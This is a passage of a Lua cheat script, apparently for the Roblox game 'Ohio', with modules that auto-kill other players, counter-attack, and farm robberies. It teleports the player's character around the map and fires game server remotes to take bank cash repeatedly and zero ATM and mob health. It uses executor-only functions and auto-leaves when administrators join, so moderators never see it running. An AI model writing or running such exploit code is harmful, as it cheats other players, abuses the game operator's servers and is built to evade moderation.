									end

									local function fn125(arg)
										if arg == nil then
											return nil
										end

										if typeof(arg) == "Instance" then
											if IsA(arg, "Player") then
												return arg
											end
											return fn124(arg)
										end

										if type(arg) == "number" then
											return Players:GetPlayerByUserId(arg)
										end
										local str3 = tostring(arg)
										local v20 = FindFirstChild(Players, str3)
										if v20 and IsA(v20, "Player") then
											return v20
										end
										local players = GetPlayerList()

										for i = 1, #players do
											local v21 = players[i]
											if v21.Name == str3 or v21.DisplayName == str3 then
												return v21
											end
										end

										return nil
									end

									local function fn126(arg)
										if typeof(arg) ~= "Vector3" then
											return nil
										end
										local players = GetPlayerList()
										local huge = math.huge
										local v20

										for i = 1, #players do
											local v21 = players[i]

											if v21 ~= LocalPlayer then
												local character = v21.Character

												if character then
													character = FindFirstChild(character, "HumanoidRootPart")
														or character.PrimaryPart
												end

												if character then
													local magnitude = (character.Position - arg).Magnitude

													if magnitude < huge then
														huge = magnitude
														v20 = v21
													end
												end
											end
										end

										return v20
									end

									local function fn127(arg)
										if typeof(arg) == "Vector3" then
											return arg
										end

										if typeof(arg) == "CFrame" then
											return arg.Position
										end

										if typeof(arg) ~= "Instance" then
											return nil
										end

										if IsA(arg, "BasePart") then
											return arg.Position
										end

										if IsA(arg, "Model") then
											local primaryPart = FindFirstChild(arg, "HumanoidRootPart")
												or arg.PrimaryPart

											return primaryPart and primaryPart.Position or nil
										end

										if IsA(arg, "Player") then
											local character = arg.Character

											if character then
												character = FindFirstChild(character, "HumanoidRootPart")
													or character.PrimaryPart
											end

											return character and character.Position or nil
										end

										return nil
									end

									local function fn128(arg)
										local v20 = fn124(arg)
										if v20 and v20 ~= LocalPlayer then
											return v20
										end
										local v21 = fn127(arg)
										local v22 = fn70()
										if v22 and v21 and (v21 - v22.Position).Magnitude <= n7 then
											return fn126(v22.Position)
										end
										return fn126(v21)
									end

									local function fn129(arg, ...)
										local v20 = table.pack(...)

										for i = 1, select("#", ...) do
											local v21 = fn124(select(i, table.unpack(v20, 1, v20.n)))
											if v21 and v21 ~= LocalPlayer then
												v19 = v21
												return v21
											end
										end

										local v21 = fn128(arg)
										if v21 and v21 ~= LocalPlayer then
											v19 = v21
											return v21
										end
										local v22 = v19
										local flag4 = v19

										if v22 then
											flag4 = v22 ~= LocalPlayer
										end

										if flag4 and Players:GetPlayerByUserId(v22.UserId) then
											return v22
										end
										return nil
									end

									local function fn130(arg, ...)
										if not TargetState.AutoCounterAtk then
											return
										end
										local v20 = table.pack(...)
										local v21 = fn129
										v20.n = 2 + v20.n - 1
										table.move(v20, 1, v20.n, 2, v20)
										v20[1] = arg
										fn123(v21(table.unpack(v20, 1, v20.n)))
									end

									local function fn131()
										local damageIndicator = FindFirstChild(LocalPlayer.PlayerGui, "DamageIndicator")
										local frame = damageIndicator and FindFirstChild(damageIndicator, "Frame")
										local imageLabel = frame and FindFirstChildWhichIsA(frame, "ImageLabel")
										return imageLabel ~= nil and imageLabel.ImageTransparency < 1
									end

									local function fn132(arg)
										if connection then
											Disconnect(connection)
											connection = nil
										end

										local humanoid = arg and FindFirstChildOfClass(arg, "Humanoid")
										if not humanoid then
											return
										end
										local health = humanoid.Health

										connection = Connect(humanoid.HealthChanged, function(arg2)
											local flag4 = arg2 < health
											health = arg2

											if flag4 and TargetState.AutoCounterOnAttack and fn131() then
												fn130(nil)
											end
										end)
									end

									if LocalPlayer.Character then
										fn132(LocalPlayer.Character)
									end

									Connect(LocalPlayer.CharacterAdded, fn132)

									if DamageIndicator and type(DamageIndicator.Show) == "function" then
										local show = DamageIndicator.Show

										DamageIndicator.Show = function(arg, arg2)
											if TargetState.AutoCounterOnAttack then
												fn130(arg)
											end

											return show(arg, arg2)
										end
									end

									Spawn(LinkSignal, "playerHit", function(arg, ...)
										if not TargetState.AutoCounterOnAttack then
											return
										end
										fn130(arg, ...)
									end)

									local autoCounter = target:CreateModule({
										Id = "ohio-auto-counter",
										Name = "Auto Counter",
										Default = TargetState.AutoCounterAtk,
										Callback = function(autoCounterAtk)
											TargetState.AutoCounterAtk = autoCounterAtk

											if
												autoCounterAtk
												and autoKillBlacklistModule
												and not TargetState.AutoKlBlacklist
											then
												autoKillBlacklistModule:Set(true)
											end
										end,
									})

									autoCounter:CreateKeybind({
										Id = "ohio-auto-counter-keybind",
										Name = "Keybind",
										Callback = function()
											autoCounter:Set(not autoCounter:Get())
										end,
									})

									autoCounter:CreateToggle({
										Id = "ohio-auto-counter-on-attack",
										Name = "On Attack",
										Default = TargetState.AutoCounterOnAttack,
										Callback = function(autoCounterOnAttack)
											TargetState.AutoCounterOnAttack = autoCounterOnAttack
										end,
									})

									local autoKillAll = target:CreateModule({
										Id = "ohio-auto-kill-all",
										Name = "Auto Kill All",
										Default = TargetState.AutoKlAll,
										Callback = function(autoKlAll)
											TargetState.AutoKlAll = autoKlAll
											fn122()
										end,
									})

									autoKillAll:CreateKeybind({
										Id = "ohio-auto-kill-all-keybind",
										Name = "Keybind",
										Callback = function()
											autoKillAll:Set(not autoKillAll:Get())
										end,
									})

									autoKillBlacklistModule = target:CreateModule({
										Id = "ohio-auto-kill-blacklist",
										Name = "Auto Kill Blacklist",
										Default = TargetState.AutoKlBlacklist,
										Callback = function(autoKlBlacklist)
											TargetState.AutoKlBlacklist = autoKlBlacklist
											fn122()
										end,
									})

									autoKillBlacklistModule:CreateKeybind({
										Id = "ohio-auto-kill-blacklist-keybind",
										Name = "Keybind",
										Callback = function()
											autoKillBlacklistModule:Set(not autoKillBlacklistModule:Get())
										end,
									})

									autoKillBlacklistModule:CreateSlider({
										Id = "ohio-auto-kill-blacklist-hide-interval-ms",
										Name = "Hide Delay",
										Min = 50,
										Max = 500,
										Default = TargetState.HideInterval * 1000,
										Step = 10,
										Callback = function(arg)
											TargetState.HideInterval = arg / 1000
										end,
									})

									LinkSignal("killMessage", function(arg)
										if not autoCounter:Get() then
											return
										end
										TargetState.AutoCounterAtk = true

										if autoKillBlacklistModule and not TargetState.AutoKlBlacklist then
											autoKillBlacklistModule:Set(true)
										end

										local v20 = fn125(arg)

										if v20 and v20 ~= LocalPlayer then
											fn123(v20)
										end
									end)

									target
										:CreateModule({ Id = "ohio-target-kill-method", Name = "Kill Method" })
										:CreateSelector({
											Id = "ohio-kill-method",
											Name = "Method",
											Options = { "Melee", "Gun" },
											Default = TargetState.Method,
											Callback = function(arg)
												TargetState.Method = fn115(arg)
												fn122()
											end,
										})

									local ignoreForceField = target:CreateModule({
										Id = "ohio-ignore-force-field",
										Name = "Ignore Force Field",
										Default = TargetState.IFF,
										Callback = function(iff)
											TargetState.IFF = iff
										end,
									})

									ignoreForceField:CreateKeybind({
										Id = "ohio-iff-keybind",
										Name = "Keybind",
										Callback = function()
											ignoreForceField:Set(not ignoreForceField:Get())
										end,
									})
								end

								fn112()

								if setthreadidentity then
									pcall(setthreadidentity, oldTI or 8)
								end

								local function fn113(arg, arg2, arg3)
									if arg3 then
										for i = 1, #arg do
											if arg[i] == arg2 then
												return
											end
										end

										Insert(arg, arg2)
									else
										for i = 1, #arg do
											if arg[i] == arg2 then
												Remove(arg, i)
												break
											end
										end
									end
								end

								local ohioFarm = window:CreateTab({ Id = "ohio-farm", Name = "Ohio Farm" })

								local function fn114()
									local tbl30 = {
										AdminCheck = false,
										AutoLeave = true,
										AutoRewards = true,
										AutoMask = { Enabled = false, Mask = nil },
										FarmAura = {
											Enabled = false,
											Options = {
												"LockPick",
												"Item",
												"JewelryCase",
												"Cash",
												"Safe",
												"ATM",
												"Airdrop",
												"Work",
												"Cash Register",
												"Vehicle",
												"Job",
											},
										},
										AutoFarm = {
											Enabled = false,
											MinStashPrice = 2500,
											MinPrice = 100,
											MinCash = 500,
											Tasks = {
												"Stash Gem",
												"Permanent Item",
												"JewelryCase",
												"Money Printer",
												"Treasure",
												"Bank",
												"Bomb Robbery",
												"Cash",
												"Airdrop",
												"Price Item",
												"Safe",
												"Vehicle",
												"ATM",
												"Cash Register",
												"Present",
												"Luck Block",
												"Spin",
												"Component Box",
												"Craft Rollie",
												"Job",
											},
										},
										AutoSell = {
											Enabled = false,
											UseIgnore = true,
											Max = 10000,
											Ignore = {
												"AS Val",
												"AUG",
												"AWP",
												"Barrett M107",
												"FN FAL",
												"M1 Garand",
												"M249 SAW",
												"P90",
												"Scar L",
												"Raygun",
												"RPG",
												"Treasure Map",
												"Fire Extinguisher",
											},
										},
										AutoUse = false,
										AutoDisassemble = false,
										AutoRemove = false,
										AutoDumbell = false,
									}

									tbl30.AutoMask.Mask = ({
										"Hockey Mask",
										"Surgeon Mask",
										"Black Bandana",
										"Blue Bandana",
										"Red Bandana",
									})[1]

									local thread = nil
									local thread2 = nil
									local thread3 = nil
									local thread4 = nil
									local thread5 = nil
									local thread6 = nil
									local tbl31 = {}
									local n7 = 0
									local tbl32 = {}
									local v18 = pairs
									local tbl33 = specialRoles or {}

									for _, v19 in v18(tbl33) do
										if typeof(v19) == "table" and typeof(v19.users) == "table" then
											for _, user in pairs(v19.users) do
												tbl32[user] = true
											end
										end
									end

									local tbl34 = {
										["2023 Present"] = true,
										["2024 Present"] = true,
										["Blue Lucky Block"] = true,
										["Gold Lucky Block"] = true,
										["Green Lucky Block"] = true,
										["Large Present"] = true,
										["Lucky Egg"] = true,
										["Medium Present"] = true,
										["Orange Lucky Block"] = true,
										["Purple Lucky Block"] = true,
										["Red Lucky Block"] = true,
										["Small Present"] = true,
										Electronics = true,
										Explosives = true,
										Materials = true,
										["Medical Supplies"] = true,
										Scrap = true,
										["Weapon Parts"] = true,
									}

									local tbl35 = {
										["Baseball Bat"] = true,
										Basketball = true,
										Bloxaide = true,
										["Bloxy Cola"] = true,
										Drone = true,
										Cake = true,
										["Stop Sign"] = true,
										["Spiked Baseball Bat"] = true,
										Sign = true,
										Glider = true,
										Flashlight = true,
										Knife = true,
										Skateboard = true,
										["Red Gloves"] = true,
										Apple = true,
										Baton = true,
										["Night Vision Goggles"] = true,
										["X-Ray Goggles"] = true,
										["Rusty Pipe"] = true,
										["Taser Gun"] = true,
										Maraca = true,
										Taco = true,
										Fireaxe = true,
										Pizza = true,
										["Riot Shield"] = true,
										Flashbang = true,
										Crowbar = true,
										Hoverboard = true,
										Guitar = true,
										["Green Paintball Gun"] = true,
										["Orange Paintball Gun"] = true,
										Katana = true,
										Burger = true,
										Chicken = true,
										Firework = true,
										Chocolates = true,
										["Fire Extinguisher"] = true,
									}

									local tbl36 = {
										Beans = 0,
										Stretcher = 0,
										["Ammo Box"] = 0,
										Coffee = 0,
										["Pepper Spray"] = 0,
										["Blue Paintball Gun"] = 0,
										["Green Paintball Gun"] = 0,
										["Orange Paintball Gun"] = 0,
										["Purple Paintball Gun"] = 0,
										Molotov = 0,
										Smoke = 0,
										["Ninja Star"] = 2,
										Tomahawk = 2,
										Donut = 0,
										C4 = 0,
										C5 = 0,
										["Light Vest"] = 0,
										["Medium Vest"] = 0,
										["Heavy Vest"] = 0,
										Bandage = 0,
										["Military Vest"] = 0,
										["EOD Vest"] = 0,
										["Military Armory"] = 2,
										Medkit = 0,
										["Candy Corn"] = 0,
										Handcuffs = 0,
									}

									local n8 = 0
									local n9 = 0

									local function fn115(arg)
										if not arg then
											return false
										end
										local game_ = FindFirstChild(workspace, "Game")
										local entities = game_ and FindFirstChild(game_, "Entities")
										if not entities or not IsDescendantOf(arg, entities) then
											return false
										end
										local itemPickup = FindFirstChild(entities, "ItemPickup")
										if itemPickup and IsDescendantOf(arg, itemPickup) then
											return false
										end
										return IsA(arg, "ProximityPrompt") or IsA(arg, "ClickDetector")
									end

									local function fn116()
										return tbl30.AutoSell.Enabled
											or tbl30.AutoUse
											or tbl30.AutoDisassemble
											or tbl30.AutoRemove
									end

									local function fn117()
										for i = 1, #tbl31 do
											local v19 = tbl31[i]

											pcall(function()
												Disconnect(v19)
											end)
										end

										tbl31 = {}
									end

									local function fn118(arg)
										if
											tbl30.AdminCheck
											and tbl30.AutoLeave
											and arg
											and arg ~= LocalPlayer
											and tbl32[arg.UserId]
										then
											LocalPlayer:Kick("[Moon.Lua] ADMIN " .. tostring(arg.Name))
										end
									end

									local function fn119()
										fn117()
										if not tbl30.AdminCheck then
											return
										end
										local players = GetPlayerList()

										for i = 1, #players do
											fn118(players[i])
										end

										Insert(tbl31, Connect(Players.PlayerAdded, fn118))
									end

									local function fn120()
										local getRewards = InvokeServer("getRewards")
										if typeof(getRewards) ~= "table" then
											return false
										end
										local flag4 = false

										if typeof(getRewards.playtimeRewards) == "table" then
											for k, playtimeReward in pairs(getRewards.playtimeRewards) do
												if
													typeof(playtimeReward) == "table"
													and playtimeReward.claimTime
													and playtimeReward.claimTime <= 0
													and not playtimeReward.isClaimed
												then
													flag4 = InvokeServer("claimPlaytimeReward", k) or flag4
													Wait(0.2)
												end
											end
										end

										local currentDay = GetAttribute(LocalPlayer, "rewardDay")
											or getRewards.currentDay
											or 1

										local n10 = rewards and rewards.DailyRewards and #rewards.DailyRewards
											or currentDay

										if typeof(getRewards.dailyRewards) == "table" then
											for i = 1, Min(currentDay, n10) do
												local v19 = getRewards.dailyRewards["Day" .. i]

												if not (typeof(v19) == "table" and v19.isClaimed) then
													flag4 = InvokeServer("claimDailyReward", i) or flag4
													Wait(0.2)
												end
											end
										end

										return flag4
									end

									local function fn121()
										pcall(task.cancel, thread4)
										thread4 = nil
										if not tbl30.AutoRewards then
											return
										end

										thread4 = Spawn(function()
											while tbl30.AutoRewards do
												local ok4, result4 = pcall(fn120)

												if not ok4 then
													warn("[OhioFarmRewards] " .. tostring(result4))
												end

												Wait(5)
											end
										end)
									end

									local function fn122()
										pcall(task.cancel, thread5)
										thread5 = nil
										if not tbl30.AutoMask.Enabled then
											return
										end

										thread5 = Spawn(function()
											while tbl30.AutoMask.Enabled do
												local v19 = fn68()
												local mask = tbl30.AutoMask.Mask

												if
													v19
													and mask
													and not fn86(LocalPlayer)
													and GetAttribute(v19, "Mask") ~= mask
												then
													local v20 = fn71(mask)

													if v20 then
														fn75(v20.guid)
														FireServer("wearMask", v20.guid)
													else
														fn92(mask)
													end
												end

												Wait(1)
											end
										end)
									end

									local function fn123()
										if not tbl30.AutoMask.Enabled then
											return true
										end
										local v19 = fn68()
										local mask = tbl30.AutoMask.Mask
										return v19 and mask and GetAttribute(v19, "Mask") == mask or false
									end

									local function fn124(arg)
										if typeof(arg) ~= "CFrame" then
											return arg
										end
										local position = arg.Position

										return CFrame.lookAt(
											arg.Position + NewVector3(0, -7.5, 0),
											position + NewVector3(0, -2.5, 0)
										)
									end

									local function fn125(arg)
										if typeof(arg) ~= "CFrame" then
											return arg
										end
										local position = arg.Position

										return CFrame.lookAt(
											arg.Position + NewVector3(0, -3.7, 0),
											position + NewVector3(0, -2.5, 0)
										)
									end

									local function fn126(arg)
										if not (arg and arg.guid and arg.ammoManager) then
											return
										end
										local v19 = fn68()
										local rightHand = v19 and FindFirstChild(v19, "RightHand")
										if not rightHand then
											return
										end

										if arg.ammoManager.UseAmmo and not arg.ammoManager:UseAmmo(1) then
											return
										end
										local position = rightHand.Position
										local n10 = position + NewVector3(0, 10, 10)
										local n11 = (n10 - position).Unit * (position - n10).Magnitude * 2
										fn75(arg.guid)
										FireServer("throwItem", arg.guid, n11, n10)

										if arg.ammoManager.ammo and arg.ammoManager.ammo <= 0 then
											fn76(arg.guid)
										end
									end

									local function fn127()
										if not fn71("Lockpick") and not fn86(LocalPlayer) then
											fn92("Lockpick")
											Wait(1)
										end

										local tbl37 = {}
										local tbl38 = {}
										local v19, v20, v21 = pairs(inventory.items or {})
										local n10 = 0
										local huge = math.huge
										local guid = nil

										for _, v22 in v19, v20, v21 do
											if not (not v22 or not v22.name) then
												n10 += 1

												if
													not (v22.name == "Treasure Map" or v22.isStashed or v22.permanent)
												then
													local sellPrice = v22.sellPrice

													if not (sellPrice and sellPrice >= 2500) then
														if
															sellPrice
															and v22.type ~= "Gun"
															and v22.ammoManager
															and v22.ammoManager.ammo
														then
															sellPrice *= v22.ammoManager.ammo
														end

														if sellPrice and sellPrice < huge then
															guid = v22.guid
															huge = sellPrice
														end

														local v23 = tbl36[v22.name]

														if v23 ~= nil then
															tbl37[v22.name] = (tbl37[v22.name] or 0) + 1

															if v23 < tbl37[v22.name] then
																Insert(tbl38, v22.guid)
															end
														end
													end
												end
											end
										end

										for i = 1, #tbl38 do
											fn76(tbl38[i])
										end

										if guid and n10 > 27 then
											fn76(guid)
										end
									end

									local function fn128()
										if not fn103(tbl30.AutoFarm.Tasks, "Bank") then
											return
										end
										local bankRobbery = FindFirstChild(workspace, "BankRobbery")
										if not bankRobbery then
											return
										end
										local now = tick()
										local vaultDoor = FindFirstChild(bankRobbery, "VaultDoor")
										local alarmLights = FindFirstChild(bankRobbery, "AlarmLights")
										local spotLight = alarmLights and FindFirstChild(alarmLights, "SpotLight")
										local bankAlarmTrigger = FindFirstChild(bankRobbery, "BankAlarmTrigger")

										if vaultDoor and (n8 == 0 or now - n8 >= 6) then
											local Frag = fn71("Frag")

											if not Frag then
												fn92("Frag")
												Wait(1)
												Frag = fn71("Frag")
											end

											if Frag then
												fn79(fn124(NewCFrame(1121.56946, 11.4600649, -373.45105)), 0.2)
												fn126(Frag)
												fn79(fn124(NewCFrame(1121.56946, 11.4600649, -373.45105)), 1)
												n8 = now
											end
										elseif spotLight and bankAlarmTrigger and not spotLight.Enabled then
											fn79(NewCFrame(bankAlarmTrigger.Position + NewVector3(0, 5, 0)), 0.5)
										end
									end

									local function fn129()
										if not fn103(tbl30.AutoFarm.Tasks, "Bomb Robbery") then
											return
										end
										local gemRobbery = FindFirstChild(workspace, "GemRobbery")
										local rubble = gemRobbery and FindFirstChild(gemRobbery, "Rubble")
										if not (rubble and FindFirstChild(rubble, "Rock")) then
											return
										end
										local now = tick()

										if n9 == 0 or now - n9 >= 20 then
											local Frag = fn71("Frag")

											if not Frag then
												fn92("Frag")
												Wait(1)
												Frag = fn71("Frag")
											end

											if Frag then
												fn79(fn124(NewCFrame(1687.90503, 25, -717.894592)), 0.2)
												fn126(Frag)
												fn79(fn124(NewCFrame(1687.90503, 25, -717.894592)), 1)
												n9 = now
											end
										end
									end

									local function fn130()
										if GetAttribute(LocalPlayer, "bankCash") == 0 then
											return
										end
										local bankRobbery = FindFirstChild(workspace, "BankRobbery")
										local bankCash = bankRobbery and FindFirstChild(bankRobbery, "BankCash")
										local main = bankCash and FindFirstChild(bankCash, "Main")

										local proximityPrompt = main
											and FindFirstChild(main, "Attachment")
											and FindFirstChild(main.Attachment, "ProximityPrompt")

										if not (main and proximityPrompt) then
											return
										end
										local v19 = fn69()

										if v19 then
											v19:ChangeState(Enum.HumanoidStateType.Jumping)
										end

										local v20 = fn124(NewCFrame(main.Position + NewVector3(0, -5, 0)))
										fn79(v20, 0.5)

										if GetAttribute(LocalPlayer, "bankCash") ~= 0 then
											for i = 1, 20 do
												FireServer("steaӏBankCash")
											end
										end

										fn79(v20, 0.5)
									end

									local function fn131()
										local atMs = FindFirstChild(workspace, "ATMs")
										if not atMs then
											return
										end
										local children = GetChildren(atMs)

										for i = 1, #children do
											local v19 = children[i]

											local primaryPart = v19.PrimaryPart
												or FindFirstChildWhichIsA(v19, "BasePart")

											local flag4

											if primaryPart then
												flag4 = (GetAttribute(v19, "health") or 0) > 1
											else
												flag4 = primaryPart
											end

											if flag4 then
												local v20 = fn69()

												if v20 then
													v20:ChangeState(Enum.HumanoidStateType.Jumping)
												end

												local v21 = fn124(primaryPart.CFrame)
												fn79(v21, 0.3)
												FireServer("setATMHealth", GetAttribute(v19, "atmId"), 0)
												SetAttribute(v19, "health", 0)
												SetAttribute(v19, "isDestroyed", true)
												fn79(v21, 0.8)
												return
											end
										end
									end

									local function fn132()
										if not fn71("Lockpick") and not fn86(LocalPlayer) then
											fn92("Lockpick")
											return
										end

										if not fn70() then
											return
										end
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Entities")
										if not game_ then
											return
										end
										local descendants = GetDescendants(game_)

										for i = 1, #descendants do
											local v19 = descendants[i]

											if IsA(v19, "ProximityPrompt") and v19.Enabled and fn115(v19) then
												local parent = v19.Parent

												if parent and not IsA(parent, "BasePart") then
													parent = parent.Parent
												end

												if parent and IsA(parent, "BasePart") then
													fn79(fn124(parent.CFrame), 0.5)
													fireproximityprompt(v19)
													fn79(fn124(parent.CFrame), 3)
													return
												end
											end
										end
									end

									local n10 = 0
									local n11 = 2
									local n12 = 2

									local function fn133(arg)
										local children = GetChildren(arg)
										local n13 = 0

										for i = 1, #children do
											local v19 = children[i]

											if
												StringFind(v19.Name, "GemPlacement", 1, true)
												and GetAttribute(v19, "gemName")
											then
												n13 += 1
											end
										end

										return n13
									end

									local function fn134()
										local now = tick()
										if now - n10 < 5 then
											return
										end
										n10 = now
										local v19 = fn70()
										if not v19 then
											return
										end

										local ok4, result4 = pcall(function()
											return debug.getupvalues(Houses.triggerSign)[2]
										end)

										if not ok4 or typeof(result4) ~= "table" then
											return
										end
										local tbl37 = {}
										local v20 = pairs
										local items = inventory.items or {}
										local n13 = 0

										for _, item in v20(items) do
											if
												item
												and (item.subtype == "valuable" or item.subtype == "gem")
												and item.sellPrice
												and item.sellPrice >= tbl30.AutoFarm.MinStashPrice
											then
												n13 += 1
												table.insert(tbl37, { item = item, order = n13 })
											end
										end

										if n13 == 0 then
											print(
												Format(
													"[OhioAutoFarm][StashGem] qualifying gems: 0 (min sellPrice: %d)",
													tbl30.AutoFarm.MinStashPrice
												)
											)

											return
										end

										table.sort(tbl37, function(arg, arg2)
											local n14 = tonumber(arg.item.sellPrice) or 0
											local n15 = tonumber(arg2.item.sellPrice) or 0
											if n14 == n15 then
												return arg.order < arg2.order
											end
											return n14 > n15
										end)

										print(
											Format(
												"[OhioAutoFarm][StashGem] qualifying gems: %d, highest sellPrice: %d",
												n13,
												tbl37[1].item.sellPrice
											)
										)

										local function fn135()
											local housingPlots = FindFirstChild(workspace, "HousingPlots")
											if not housingPlots then
												return nil
											end
											local children = GetChildren(housingPlots)

											for i = 1, #children do
												local v21 = children[i]
												if not FindFirstChild(v21, "Mailbox") then
													return v21
												end
											end

											return nil
										end

										local function fn136(house)
											if not house then
												return nil
											end
											result4.inDialog = false

											if InvokeServer("rentHouse", house) then
												result4.house = house

												pcall(function()
													result4:UpdateData()
													result4.Permissions:resetPermissions("house")
													result4.HomeManager:setOpen("Menu")
												end)
											end

											dialogQueue:Next()
										end

										local house = result4.house

										if not house then
											local v21 = fn135()
											house = fn136(v21)
										end

										if not house then
											return
										end
										local furniture = nil

										if house.Building then
											local children = GetChildren(house.Building)
											furniture = nil

											for i = 1, #children do
												furniture = FindFirstChild(children[i], "Furniture")
												if not furniture then
													furniture = nil
													continue
												end
												break
											end
										end

										if not furniture then
											return
										end
										local children = GetChildren(furniture)
										local n14 = 1
										local n15 = 0
										local n16 = 0
										local n17 = 0
										local n18 = 0

										for i = 1, #children do
											if not (#tbl37 < n14) then
												local v21 = children[i]
												local guid = GetAttribute(v21, "guid")

												local furnitureByGUID = guid
													and ClientHouseFurniture:GetFurnitureByGUID(guid)

												local name2 = furnitureByGUID
													and furnitureByGUID.name
													and FurnitureDefs[furnitureByGUID.name]

												if
													furnitureByGUID
													and furnitureByGUID.owner == LocalPlayer
													and name2
													and name2.furnitureType == "GemDisplay"
												then
													n15 += 1
													local tbl38 = {}
													local children2 = GetChildren(v21)

													for i2 = 1, #children2 do
														local v22 = children2[i2]

														if
															StringFind(v22.Name, "GemPlacement", 1, true)
															and not GetAttribute(v22, "gemName")
														then
															table.insert(tbl38, v22)
														end
													end

													n16 += #tbl38

													if #tbl38 > 0 then
														local primaryPart = tbl38[1]

														if
															v21.PrimaryPart
															and FindFirstChild(v21.PrimaryPart, "ProximityPrompt")
														then
															primaryPart = v21.PrimaryPart
														end

														local cFrame = v19.CFrame
														local cFrame2

														if primaryPart and IsA(primaryPart, "BasePart") then
															cFrame2 = primaryPart.CFrame
														else
															cFrame2 = cFrame
														end

														fn78(v19, cFrame2, 0.2)
														local now2 = tick()

														for i2 = 1, #tbl38 do
															if not (#tbl37 < n14) then
																local item = tbl37[n14].item
																local primaryPart2 = tbl38[i2]

																if
																	v21.PrimaryPart
																	and FindFirstChild(
																		v21.PrimaryPart,
																		"ProximityPrompt"
																	)
																then
																	primaryPart2 = v21.PrimaryPart
																end

																local v22 = fn133(v21)
																fn75(item.guid)
																fn78(v19, cFrame2, 0.2)

																FireServer(
																	"updateGemDisplay",
																	furnitureByGUID.guid,
																	primaryPart2.Name,
																	item.guid
																)

																local n19 = tick() + n11
																local n20 = 0

																while tick() < n19 do
																	fn78(v19, cFrame2, 0.1)

																	if v22 < fn133(v21) then
																		n20 += 1
																		if not (n12 <= n20) then
																			continue
																		end
																	else
																		n20 = 0
																		continue
																	end

																	break
																end

																if not (n20 < n12) then
																	fn78(v19, cFrame2, 0.3)

																	if not (fn133(v21) <= v22) then
																		n17 += 1
																		n14 += 1
																		continue
																	end
																end
															end

															break
														end

														if v19.Parent then
															v19.CFrame = cFrame
															fn77(v19)
														end

														n18 += tick() - now2
													end
												end

												continue
											end

											break
										end

										print(
											Format(
												"[OhioAutoFarm][StashGem] gem displays: %d, free slots: %d, placed: %d/%d, dwell: %.2fs",
												n15,
												n16,
												n17,
												n13,
												n18
											)
										)
									end

									local function fn135()
										local v19 = fn70()
										local atMs = FindFirstChild(workspace, "ATMs")
										if not v19 or not atMs then
											return
										end
										local children = GetChildren(atMs)

										for i = 1, #children do
											local v20 = children[i]

											local primaryPart = v20.PrimaryPart
												or FindFirstChildWhichIsA(v20, "BasePart")

											local flag4

											if primaryPart then
												flag4 = (GetAttribute(v20, "health") or 0) > 1
											else
												flag4 = primaryPart
											end

											flag4 = flag4 and (v19.Position - primaryPart.Position).Magnitude <= 35

											if flag4 then
												Wait(0.1)
												SetAttribute(v20, "health", 0)
											end
										end
									end

									local function fn136(arg)
										local v19 = fn70()
										local mobs = arg and FindFirstChild(arg, "Mobs")
										if not v19 or not mobs then
											return
										end
										local children = GetChildren(mobs)
										local v20 = nil
										local v21 = nil

										for i = 1, #children do
											local v22 = children[i]
											local primaryPart = v22.PrimaryPart

											primaryPart = primaryPart
												and (v19.Position - primaryPart.Position).Magnitude

											if primaryPart and primaryPart <= 35 and (not v20 or primaryPart < v20) then
												v20 = primaryPart
												v21 = v22
											end
										end

										if v21 then
											SetAttribute(v21, "health", 0)
										end
									end

									local function fn137()
										local local_ = workspace.Game and workspace.Game.Local
										local droppables = local_ and FindFirstChild(local_, "droppables")
										if not droppables then
											return
										end
										local children = GetChildren(droppables)

										for i = 1, #children do
											local v19 = children[i]

											if v19 and v19.Name == "Money Printer" then
												local display = FindFirstChild(v19, "Display")

												local num = display
													and FindFirstChild(display, "SurfaceGui")
													and FindFirstChild(display.SurfaceGui, "TextLabel")
													and tonumber(display.SurfaceGui.TextLabel.Text)

												if num and num <= 3 and display then
													local v20 = fn69()

													if v20 then
														v20:ChangeState(Enum.HumanoidStateType.Jumping)
													end

													fn79(fn124(display.CFrame), 0.5)
													return
												end
											end
										end
									end

									local function fn138()
										local treasureMap = fn71("Treasure Map")

										if treasureMap then
											fn75(treasureMap.guid)
										end

										local local_ = workspace.Game and workspace.Game.Local
										local debris = local_ and FindFirstChild(local_, "Debris")
										if not debris then
											return
										end
										local children = GetChildren(debris)

										for i = 1, #children do
											local v19 = children[i]

											if IsA(v19, "BasePart") then
												local proximityPrompt = FindFirstChildOfClass(v19, "ProximityPrompt")

												if
													proximityPrompt
													and proximityPrompt.Enabled
													and proximityPrompt.ActionText == "Dig"
												then
													local v20 = fn69()

													if v20 then
														v20:ChangeState(Enum.HumanoidStateType.Jumping)
													end

													local v21 = fn124(v19.CFrame)
													fn79(v21, 0.4)

													if treasureMap then
														fn75(treasureMap.guid)
													end

													for i2 = 1, 5 do
														if treasureMap then
															fn75(treasureMap.guid)
														end

														fireproximityprompt(proximityPrompt)
														fn79(v21, 0.2)
													end

													fn79(v21, 4)
													return
												end
											end
										end
									end

									local function fn139()
										if (GetAttribute(LocalPlayer, "slotSpins") or 0) <= 0 then
											return
										end
										local serverFurniture = FindFirstChild(workspace, "ServerFurniture")
										if not serverFurniture then
											return
										end
										local children = GetChildren(serverFurniture)

										for i = 1, #children do
											local v19 = children[i]

											if
												IsA(v19, "Model")
												and GetAttribute(v19, "furnitureName") == "SlotMachine"
											then
												local hitbox = FindFirstChild(v19, "Hitbox")

												if hitbox then
													local descendants = GetDescendants(v19)

													for i2 = 1, #descendants do
														local v20 = descendants[i2]

														if IsA(v20, "ProximityPrompt") then
															fn79(fn124(hitbox.CFrame), 0.2)
															fireproximityprompt(v20)
															return
														end
													end
												end

												return
											end
										end
									end

									local function fn140()
										local jobs = FindFirstChild(workspace, "Jobs")

										if jobs then
											local children = GetChildren(jobs)

											for i = 1, #children do
												local triggers = FindFirstChild(children[i], "Triggers")

												local beginJobTrigger = triggers
													and FindFirstChild(triggers, "BeginJobTrigger")

												local proximityPrompt = beginJobTrigger
													and beginJobTrigger.ProximityPrompt

												if proximityPrompt then
													fn79(fn125(beginJobTrigger.CFrame), 0.2)
													fireproximityprompt(proximityPrompt)
													break
												end
											end
										end

										local local_ = workspace.Game and workspace.Game.Local
										local rubbish = local_ and FindFirstChild(local_, "Rubbish")

										if rubbish then
											local children = GetChildren(rubbish)

											for i = 1, #children do
												local v19 = children[i]

												local primaryPart = v19.PrimaryPart
													and FindFirstChildOfClass(v19.PrimaryPart, "ClickDetector")

												if primaryPart then
													fireclickdetector(primaryPart)
												end
											end
										end
									end

									local function fn141()
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Airdrops")
										if not game_ then
											return
										end
										local children = GetChildren(game_)

										for i = 1, #children do
											local v19 = children[i]
